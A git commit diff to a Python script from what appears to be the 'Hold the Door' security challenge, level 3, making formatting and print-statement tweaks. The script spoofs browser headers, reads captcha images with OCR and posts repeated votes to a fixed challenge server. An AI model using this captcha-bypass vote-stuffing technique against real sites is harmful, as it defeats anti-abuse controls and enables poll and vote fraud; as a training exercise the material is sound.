ec7d27d7c6bb7fb0ec666a8a02f0996b1ec6a805
alzheimeer <fogniebla@hotmail.com>
2019-10-19 01:17:22 -0500

    fix hodor task 3

--- level_3/3.py
+++ level_3/3.py
@@ -24,7 +24,8 @@ url = 'http://158.69.76.135/level3.php'
 captcha = 'http://158.69.76.135/captcha.php'
 data = {'id': str(ID), 'holdthedoor': 'Submit'}
 
-headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
+headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
 headers = {"User-Agent": headerwin, "Referer": url}
 success = 'Hold the Door challenge - Level 3'
 ok = 0
@@ -34,7 +35,6 @@ votescurrent = 0
 s = requests.Session()
 s.headers.update(headers)
 response = s.get(url, headers=headers)
-    
 
 txt = response.text.split()
 txtid = txt.index(str(ID))
@@ -66,15 +66,15 @@ for i in range(votescurrent, votes):
     #img = cv2.imread("captcha.png")
     readimg = pytesseract.image_to_string(Image.open('captcha.png'))
     data["captcha"] = readimg
-    print(votescurrent)
     response1 = s.post(url, data=data)
     if response1.status_code is 200 and success in response1.text:
         ok += 1
-        print("{} Ok ".format(ok), end='\r', flush=True)
+        print("{} Ok   ".format(ok), end='\r', flush=True)
     else:
         fail += 1
         print("{} Fail".format(fail), end='\r', flush=True)
-        continue
+
 print()
 print("------------------------------------------------------------------")
 print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
+print("------------------------------------------------------------------")
